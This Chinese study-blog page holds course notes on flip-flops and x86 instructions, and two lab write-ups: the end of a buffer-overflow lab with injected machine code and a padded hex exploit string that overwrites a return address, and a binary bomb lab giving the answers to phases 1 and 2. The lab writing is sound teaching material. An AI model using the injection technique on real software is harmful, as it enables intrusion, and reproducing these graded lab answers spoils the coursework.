8048ce4:	68 16 a4 04 08       	push   $0x804a416</span><br><span class="line"> 8048ce9:	e8 52 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048cee:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cf1:	90                   	nop</span><br><span class="line"> 8048cf2:	c9                   	leave  </span><br><span class="line"> 8048cf3:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>可以看到调用<code>getbuf</code>后，返回值被储存在<code>%eax</code>中，于是我们只要修改<code>%eax</code>的值为我们的<code>cookie</code>即可，同时要求复原<code>%ebp</code>，那么我们在调用<code>getbuf</code>记住<code>%ebp</code>的值，再执行我们的语句时重新赋给<code>%ebp</code>即可，我们先在调用<code>getbuf</code>前设置断点，查看<code>%ebp</code>的值</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631621.png" alt="image-20211225180505432"></p>
<p>可见<code>%ebp</code>的值为<code>0x55682fb0</code>，整理一下我们的任务</p>
<ul>
<li>设置<code>%eax</code>为我们的<code>cookie</code> <code>0x73413ee0</code></li>
<li>设置<code>%ebp</code>为初始值<code>0x55682fb0</code></li>
<li>回到<code>test</code>函数中调用<code>getbuf</code>后的下一个语句地址<code>0x8048c8d</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*汇编代码*/</span><br><span class="line">movl $0x73413ee0, %eax</span><br><span class="line">movl $0x55682fb0, %ebp</span><br><span class="line">push $0x8048c8d</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*机器码*/</span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 e0 3e 41 73       	mov    $0x73413ee0,%eax</span><br><span class="line">   5:	bd b0 2f 68 55       	mov    $0x55682fb0,%ebp</span><br><span class="line">   a:	68 8d 8c 04 08       	push   $0x8048c8d</span><br><span class="line">   f:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>接着步骤和之前相同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b8 e0 3e 41 73 </span><br><span class="line">bd b0 2f 68 55 </span><br><span class="line">68 8d 8c 04 08 </span><br><span class="line">c3 /*函数代码*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">5e 2f 68 55/*%eax地址*/</span><br></pre></td></tr></table></figure>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631622.png" alt="image-20211225181341091" style="zoom:80%;" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/20/%E8%A7%A6%E5%8F%91%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/20/%E8%A7%A6%E5%8F%91%E5%99%A8/" class="post-title-link" itemprop="url">触发器</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-20 20:35:22" itemprop="dateCreated datePublished" datetime="2021-12-20T20:35:22+08:00">2021-12-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-26 19:08:14" itemprop="dateModified" datetime="2021-12-26T19:08:14+08:00">2021-12-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h1><ul>
<li>触发器有两个互补的输出端 $Q$ 和 $\overline{Q}$</li>
<li><p>有两个稳定状态 <code>1</code> 和 <code>0</code></p>
<ul>
<li><code>1</code>状态：$Q = 1\quad\overline{Q} = 0$</li>
<li><code>0</code>状态：$Q = 0\quad\overline{Q} = 1$</li>
</ul>
</li>
<li><p>现态：输入信号作用前的状态</p>
<ul>
<li>记作$Q$ 和 $\overline{Q}$</li>
</ul>
</li>
<li><p>次态：输入信号作用后的状态</p>
<ul>
<li>记作 $Q^{n+1}$ 和 $\overline{Q^{n+1}}$</li>
</ul>
</li>
</ul>
<h2 id="触发器常用的描述方法"><a href="#触发器常用的描述方法" class="headerlink" title="触发器常用的描述方法"></a>触发器常用的描述方法</h2><ul>
<li>功能表</li>
<li>状态表</li>
<li>状态图</li>
<li>次态方程</li>
<li>激励表</li>
<li>卡诺图</li>
</ul>
<h3 id="功能表"><a href="#功能表" class="headerlink" title="功能表"></a>功能表</h3><p>反映了触发器在不同输入下对应功能的表格</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908957.png" alt="image-20211220205402667" style="zoom:50%;" /></p>
<h3 id="状态表"><a href="#状态表" class="headerlink" title="状态表"></a>状态表</h3><p>反映了触发器在输入作用下现态和次态之间的转移关系</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908958.png" alt="image-20211220205511950" style="zoom:50%;" /></p>
<h3 id="激励表"><a href="#激励表" class="headerlink" title="激励表"></a>激励表</h3><p>反映了触发器从现态 $Q$ 转移到某种次态 $Q^{n+1}$ 时，对输入信号的要求</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908959.png" alt="image-20211220205633985" style="zoom:50%;" /></p>
<h3 id="状态图"><a href="#状态图" class="headerlink" title="状态图"></a>状态图</h3><p>反应触发器两种状态之间转移关系的有向图</p>
<ul>
<li>圆圈表示稳定状态</li>
<li>有向线段表示状态转移的方向<ul>
<li>起点：现态</li>
<li>终点：次态</li>
<li>触发条件</li>
</ul>
</li>
</ul>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908960.png" alt="image-20211220205923424" style="zoom:50%;" /></p>
<h3 id="卡诺图"><a href="#卡诺图" class="headerlink" title="卡诺图"></a>卡诺图</h3><p>根据触发器的功能表或状态表所得到的反映触发器次态和现态以及输入关系的卡诺图</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908961.png" alt="image-20211220210111667" style="zoom:50%;" /></p>
<h3 id="次态方程"><a href="#次态方程" class="headerlink" title="次态方程"></a>次态方程</h3><p>反应触发器次态和现态以及输入关系的表达式</p>
<ul>
<li><p>次态方程</p>
<ul>
<li>$Q^{n+1}=\overline{S}+RQ$</li>
</ul>
</li>
<li><p>约束方程</p>
<ul>
<li>$R+S=1$</li>
</ul>
</li>
</ul>
<h2 id="基本R-S触发器"><a href="#基本R-S触发器" class="headerlink" title="基本R-S触发器"></a>基本R-S触发器</h2><p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908962.png" alt="image-20211220211625159" style="zoom:50%;" /></p>
<ul>
<li>构成各种功能触发器的基本部件</li>
<li>R：置0端或复位端</li>
<li>S：置1端或置位端</li>
</ul>
<h3 id="功能表与状态表"><a href="#功能表与状态表" class="headerlink" title="功能表与状态表"></a>功能表与状态表</h3><p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908963.png" alt="image-20211220211900696" style="zoom:50%;" /></p>
<h3 id="状态表与激励表"><a href="#状态表与激励表" class="headerlink" title="状态表与激励表"></a>状态表与激励表</h3><p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908964.png" alt="image-20211220211942876" style="zoom:50%;" /></p>
<h3 id="状态表、状态图、卡诺图、次态方程、约束方程"><a href="#状态表、状态图、卡诺图、次态方程、约束方程" class="headerlink" title="状态表、状态图、卡诺图、次态方程、约束方程"></a>状态表、状态图、卡诺图、次态方程、约束方程</h3><p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261908965.png" alt="image-20211220212035910" style="zoom:50%;" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/18/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/18/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" class="post-title-link" itemprop="url">汇编指令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-18 21:15:50" itemprop="dateCreated datePublished" datetime="2021-12-18T21:15:50+08:00">2021-12-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-20 10:52:42" itemprop="dateModified" datetime="2021-12-20T10:52:42+08:00">2021-12-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="jump指令"><a href="#jump指令" class="headerlink" title="jump指令"></a>jump指令</h2><p>用作跳转</p>
<ul>
<li>je</li>
</ul>
<p>jmp equal 相等时跳转</p>
<ul>
<li>jne</li>
</ul>
<p>jmp not equal 不等时跳转</p>
<ul>
<li>jz</li>
</ul>
<p>jmp (when) zf(1) zf为1时跳转</p>
<p>ZF（zero flag）:零标志，最近操作结果为0（列如 逻辑操作 等）<br>ZF=0（结果为0，ZF就置1）</p>
<ul>
<li>jnz</li>
</ul>
<p>jmp zf=0 zf为0时跳转</p>
<ul>
<li>jg</li>
</ul>
<p>jmp if  greater 前 &gt; 后</p>
<ul>
<li>jge</li>
</ul>
<p>jmp if greater or equal 前 &gt;= 后</p>
<ul>
<li>ja</li>
</ul>
<p>jmp above 大于转移</p>
<ul>
<li>jb</li>
</ul>
<p>jmp below 小于转移</p>
<ul>
<li>jl</li>
</ul>
<p>jmp low 小于转移</p>
<h2 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h2><p>CMP（比较）指令执行从<strong>目的操作数中减去源操作数</strong>的隐含减法操作，并且不修改任何操作数</p>
<p><code>CMP destination,source</code></p>
<p>当实际的减法发生时，CMP 指令按照计算结果修改溢出、符号、零、进位、辅助进位和奇偶标志位。</p>
<p>如果比较的是两个无符号数，则零标志位和进位标志位表示的两个操作数之间的关系如右表所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>CMP结果</th>
<th>ZF</th>
<th>CF</th>
</tr>
</thead>
<tbody>
<tr>
<td>目的操作数 &lt; 源操作数</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>目的操作数 &gt; 源操作数</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>目的操作数 = 源操作数</td>
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
<p>如果比较的是两个有符号数，则符号标志位、零标志位和溢出标志位表示的两个操作数之间的关系如右表所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>CMP结果</th>
<th>标志位</th>
</tr>
</thead>
<tbody>
<tr>
<td>目的操作数 &lt; 源操作数</td>
<td>SF ≠ OF</td>
</tr>
<tr>
<td>目的操作数 &gt; 源操作数</td>
<td>SF=OF</td>
</tr>
<tr>
<td>目的操作数 = 源操作数</td>
<td>ZF=1</td>
</tr>
</tbody>
</table>
</div>
<h2 id="地址传送指令"><a href="#地址传送指令" class="headerlink" title="地址传送指令"></a>地址传送指令</h2><ul>
<li>lea</li>
</ul>
<p>装入有效地址</p>
<h2 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h2><ul>
<li>sar</li>
</ul>
<p>算术右移 (每位右移，低位进 CF，高位不变)</p>
<ul>
<li>shr</li>
</ul>
<p>逻辑右移（每位右移，低位进 CF，高位补 0）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/18/binary-bomb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/18/binary-bomb/" class="post-title-link" itemprop="url">binary bomb lab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-18 20:20:41" itemprop="dateCreated datePublished" datetime="2021-12-18T20:20:41+08:00">2021-12-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-20 10:51:46" itemprop="dateModified" datetime="2021-12-20T10:51:46+08:00">2021-12-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Binary-Bomb-Lab"><a href="#Binary-Bomb-Lab" class="headerlink" title="Binary Bomb Lab"></a>Binary Bomb Lab</h1><p>这个实验很好玩，所以操你妈</p>
<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">08048b30 &lt;phase_1&gt;:</span><br><span class="line"> 8048b30:	55                   	push   %ebp</span><br><span class="line"> 8048b31:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048b33:	83 ec 10             	sub    $0x10,%esp</span><br><span class="line"> 8048b36:	68 04 a1 04 08       	push   $0x804a104</span><br><span class="line"> 8048b3b:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048b3e:	e8 45 05 00 00       	call   8049088 &lt;strings_not_equal&gt;</span><br><span class="line"> 8048b43:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048b46:	85 c0                	test   %eax,%eax</span><br><span class="line"> 8048b48:	74 05                	je     8048b4f &lt;phase_1+0x1f&gt;</span><br><span class="line"> 8048b4a:	e8 3c 06 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048b4f:	c9                   	leave  </span><br><span class="line"> 8048b50:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>那么phase1很简单，我们看到调用了<code>&lt;strings_not_equal&gt;</code>函数，理性分析是个判断字符串是否相等的函数。哪两个字符串呢，我们注意到push了两个参数进去，分别是<code>$0x804a104</code>和<code>0x8(%ebp)</code>，那么<code>0x8(%ebp)</code>中的内容便是我们输入的结果，<code>$0x804a104</code>便是原本字符串的地址，查看即可</p>
<p>查看内存操作：<code>x/s 0x804a104</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112182040076.png" alt="image-20211218204026585"></p>
<p>如果我们查看<code>0x8(%ebp)</code>的内容，会惊喜的发现就是我们输入的内容</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112182056432.png" alt="image-20211218205656328"></p>
<p>那么答案呼之欲出了</p>
<p><code>I turned the moon into something I call a Death Star.</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112182100276.png" alt="image-20211218210003585"></p>
<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">08048b51 &lt;phase_2&gt;:</span><br><span class="line"> 8048b51:	55                   	push   %ebp</span><br><span class="line"> 8048b52:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048b54:	56                   	push   %esi</span><br><span class="line"> 8048b55:	53                   	push   %ebx</span><br><span class="line"> 8048b56:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 8048b59:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax</span><br><span class="line"> 8048b5f:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048b62:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 8048b64:	8d 45 dc             	lea    -0x24(%ebp),%eax</span><br><span class="line"> 8048b67:	50                   	push   %eax</span><br><span class="line"> 8048b68:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048b6b:	e8 43 06 00 00       	call   80491b3 &lt;read_six_numbers&gt;</span><br><span class="line"> 8048b70:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048b73:	83 7d dc 01          	cmpl   $0x1,-0x24(%ebp)</span><br><span class="line"> 8048b77:	74 05                	je     8048b7e &lt;phase_2+0x2d&gt;</span><br><span class="line"> 8048b79:	e8 0d 06 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048b7e:	8d 5d dc             	lea    -0x24(%ebp),%ebx</span><br><span class="line"> 8048b81:	8d 75 f0             	lea    -0x10(%ebp),%esi</span><br><span class="line"> 8048b84:	8b 03                	mov    (%ebx),%eax</span><br><span class="line"> 8048b86:	01 c0                	add    %eax,%eax</span><br><span class="line"> 8048b88:	39 43 04             	cmp    %eax,0x4(%ebx)</span><br><span class="line"> 8048b8b:	74 05                	je     8048b92 &lt;phase_2+0x41&gt;</span><br><span class="line"> 8048b8d:	e8 f9 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048b92:	83 c3 04             	add    $0x4,%ebx</span><br><span class="line"> 8048b95:	39 f3                	cmp    %esi,%ebx</span><br><span class="line"> 8048b97:	75 eb                	jne    8048b84 &lt;phase_2+0x33&gt;</span><br><span class="line"> 8048b99:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048b9c:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax</span><br><span class="line"> 8048ba3:	74 05                	je     8048baa &lt;phase_2+0x59&gt;</span><br><span class="line"> 8048ba5:	e8 e6 fb ff ff       	call   8048790 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 8048baa:	8d 65 f8             	lea    -0x8(%ebp),%esp</span><br><span class="line"> 8048bad:	5b                   	pop    %ebx</span><br><span class="line"> 8048bae:	5e                   	pop    %esi</span><br><span class="line"> 8048baf:	5d                   	pop    %ebp</span><br><span class="line"> 8048bb0:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>很明显看到一个<code>&lt;read_six_numbers&gt;</code>，如果你学过幼儿园英文，你可能会觉得他要读6个数，事实上也是这样的，我们来看<code>&lt;read_six_numbers&gt;</code>的函数实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">080491b3 &lt;read_six_numbers&gt;:</span><br><span class="line"> 80491b3:	55                   	push   %ebp</span><br><span class="line"> 80491b4:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 80491b6:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 80491b9:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 80491bc:	8d 50 14             	lea    0x14(%eax),%edx</span><br><span class="line"> 80491bf:	52                   	push   %edx</span><br><span class="line"> 80491c0:	8d 50 10             	lea    0x10(%eax),%edx</span><br><span class="line"> 80491c3:	52                   	push   %edx</span><br><span class="line"> 80491c4:	8d 50 0c             	lea    0xc(%eax),%edx</span><br><span class="line"> 80491c7:	52                   	push   %edx</span><br><span class="line"> 80491c8:	8d 50 08             	lea    0x8(%eax),%edx</span><br><span class="line"> 80491cb:	52                   	push   %edx</span><br><span class="line"> 80491cc:	8d 50 04             	lea    0x4(%eax),%edx</span><br><span class="line"> 80491cf:	52                   	push   %edx</span><br><span class="line"> 80491d0:	50                   	push   %eax</span><br><span class="line"> 80491d1:	68 e3 a2 04 08       	push   $0x804a2e3</span><br><span class="line"> 80491d6:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 80491d9:	e8 32 f6 ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> 80491de:	83 c4 20             	add    $0x20,%esp</span><br><span class="line"> 80491e1:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line"> 80491e4:	7f 05                	jg     80491eb &lt;read_six_numbers+0x38&gt;</span><br><span class="line"> 80491e6:	e8 a0 ff ff ff       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 80491eb:	c9                   	leave  </span><br><span class="line"> 80491ec:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>注意到<code>$0x804a2e3</code>地址存放了这个函数读入功能的格式<code>&quot;%d %d %d %d %d %d&quot;</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112182108010.png" alt="image-20211218210855295"></p>
<p>学过C语言便知，输入的是6个整型</p>
<p>因此我们输入6个测试数据，越奇怪越好，查看寄存器的时候就能轻易辨识出是输入的哪一个数据</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112182112325.png" alt="image-20211218211256354"></p>
<p>接着我们从第一个<code>cmp</code>开始分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048b73:	83 7d dc 01          	cmpl   $0x1,-0x24(%ebp)</span><br><span class="line">8048b77:	74 05                	je     8048b7e &lt;phase_2+0x2d&gt;</span><br><span class="line">8048b79:	e8 0d 06 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p><code>je</code>为相等跳转，否则就会接着执行下一条语句然后爆炸，所以这里意图很明显，要求<code>-0x24(%ebp)</code>的值等于<code>0x1</code>，那么这个<code>-0x24(%ebp)</code>里面是什么东西呢？我们输出看一下</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112182137345.png" alt="image-20211218213749997"></p>
<p>因为前面数字取得好，所以这里很明显发现这是第一个输入的数字，所以就是要求第一个数字等于<code>0x1</code>也就是<code>1</code>，接着更改测试数据</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191515015.png" alt="image-20211219151508210"></p>
<p>这次执行后<code>-0x24(%ebp)</code>的值与<code>0x1</code>相等，因此不会爆炸，接着执行之后的语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">8048b7e:	8d 5d dc             	lea    -0x24(%ebp),%ebx</span><br><span class="line">8048b81:	8d 75 f0             	lea    -0x10(%ebp),%esi</span><br><span class="line">8048b84:	8b 03                	mov    (%ebx),%eax</span><br><span class="line">8048b86:	01 c0                	add    %eax,%eax</span><br><span class="line">8048b88:	39 43 04             	cmp    %eax,0x4(%ebx)</span><br><span class="line">8048b8b:	74 05                	je     8048b92 &lt;phase_2+0x41&gt;</span><br><span class="line">8048b8d:	e8 f9 05 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>发现分别向<code>ebx</code>和<code>esi</code>内传了<code>-0x24(%ebp)</code> 和<code>-0x10(%ebp)</code>，我们前面知道<code>-0x24(%ebp)</code> 是<code>1</code>，那么我们来看看<code>-0x10(%ebp)</code>里面是啥</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191523708.png" alt="image-20211219152355191"></p>
<p>是<code>66</code>既我们最后一个输入的数，接着</p>
<p><code>mov    (%ebx),%eax</code></p>
<p>把<code>1</code>给了<code>%eax</code>，再让<code>%eax</code>自加，自加后<code>%eax</code>的值与<code>0x4(%ebx)</code>比较，不相等则爆炸，我们再来看<code>0x4(%ebx)</code>里面是啥</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191527194.png" alt="image-20211219152750263"></p>
<p>发现是我们输入的第二个数据，我们知道<code>%eax</code>自加的结果是<code>2</code>，那么就是要求第二个输入的数据是<code>2</code>，如果相同，则跳转到<code>&lt;phase_2+0x41&gt;</code>，否则爆炸，我们更改输入数据，接着测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048b92:	83 c3 04             	add    $0x4,%ebx</span><br><span class="line">8048b95:	39 f3                	cmp    %esi,%ebx</span><br><span class="line">8048b97:	75 eb                	jne    8048b84 &lt;phase_2+0x33&gt;</span><br></pre></td></tr></table></figure>
<p>刚才没爆炸于是跳转到这里，我们看到给<code>%ebx</code>地址<code>+4</code>，此时<code>%ebx</code>值为<code>2</code>，比较<code>%esi(66)</code>与<code>%ebx(2)</code>的大小，如果不相等则跳回上一个句段，如果相等则向下执行，我们知道上一个句段的作用是把读进来数自加然后与下一个数比较，要求相等，我们已知第1个数为<code>1</code>，那么要求第2个数为<code>1+1 = 2</code>，第三个数<code>2+2 = 4</code>，以此类推，答案应该是</p>
<p><code>1 2 4 8 16 32(%esi)</code></p>
<p>当满足<code>%esi = %ebx</code>时，向下执行，结束phase_2</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112191541028.png" alt="image-20211219154136170"></p>
